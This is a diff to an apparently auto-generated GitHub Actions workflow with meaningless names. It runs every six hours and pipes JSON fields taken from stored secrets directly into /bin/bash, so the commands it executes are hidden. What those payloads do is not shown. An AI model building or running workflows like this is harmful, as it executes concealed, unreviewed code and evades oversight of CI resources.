@@ -1,29 +1,25 @@
 name: fuluohan4710
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 1/6 * * *'
+    - cron: '21 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: fuluohan4710
         env:
-          ub09316: ${{ secrets.ub09316 }}
+          chhd9: ${{ secrets.chhd9 }}
         run: |
-          echo $ub09316 | jq -r .zhtkx908 | /bin/bash
-          echo $t176 | jq -r .bt47707 | /bin/bash
-          echo $rxo9212 | jq -r .v3 | /bin/bash
-          echo $nwh067 | jq -r .rn868 | /bin/bash
-          echo $g4 | jq -r .fr8250 | /bin/bash
-          echo $gjg30909 | jq -r .jh88 | /bin/bash
-          echo $lhq901 | jq -r .cvvdz73 | /bin/bash
-          echo $ljd15 | jq -r .rvtpi986 | /bin/bash
-          echo $c8880 | jq -r .ixntr69 | /bin/bash
-          echo $i802 | jq -r .i507 | /bin/bash
-          echo $jrm64 | jq -r .ul8 | /bin/bash
-          echo $ycw57 | jq -r .fekt158 | /bin/bash
-          echo $n2156 | jq -r .wou50 | /bin/bash
+          echo $chhd9 | jq -r .vendu02 | /bin/bash
+          echo $xca242 | jq -r .hlayp2 | /bin/bash
+          echo $sc1 | jq -r .rmdsk49 | /bin/bash
+          echo $uj51866 | jq -r .drcb8 | /bin/bash
+          echo $hrsod01 | jq -r .bw141 | /bin/bash
+          echo $xllff21708 | jq -r .yhii3 | /bin/bash
+          echo $kqfdl776 | jq -r .vwx03713 | /bin/bash
+          echo $uxq359 | jq -r .ulneo67 | /bin/bash
 
